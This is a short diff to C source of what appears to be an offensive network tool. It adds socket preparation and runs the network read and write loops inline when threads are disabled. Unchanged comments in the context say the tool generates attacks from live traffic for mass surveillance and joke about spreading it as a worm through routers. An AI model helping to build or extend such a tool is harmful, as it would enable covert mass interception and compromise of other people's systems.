@@ -207,6 +207,9 @@ AS_context *AS_ctx_new() {
     // need a strategy for fds here to finish select() support for the 
     ctx->socket_fd = 50;
     
+    prepare_read_sockets(ctx);
+    prepare_write_sockets(ctx);
+
     // pool mutex.. so we can ensure its separate
     pthread_mutex_init(&ctx->network_pool_mutex, NULL);
 
@@ -231,7 +234,7 @@ AS_context *AS_ctx_new() {
     PCAP_Init(ctx);
 
     // start threads after loading.. so we dont have useless packets to process
-    Threads_Start(ctx);
+    //Threads_Start(ctx);
 
     // initialize real time http session discovery.. so we can automatically geenerate attacks for mass surveillance from live arbitrary traffic
     // aint this going to fuck shit up :).. esp on a worm w routers ;).. shittt... good luck
@@ -327,6 +330,13 @@ int Subsystems_Perform(AS_context *ctx) {
     // several things)
     if (ctx->module_list)
         Modules_Perform(ctx);
+
+    // perform nettwork actions if the threads arent existing
+    if (!ctx->network_write_threaded)
+        OutgoingQueueProcess(ctx);
+
+    if (!ctx->network_read_thread)
+        network_read_loop(ctx);
 
     return 1;
 }
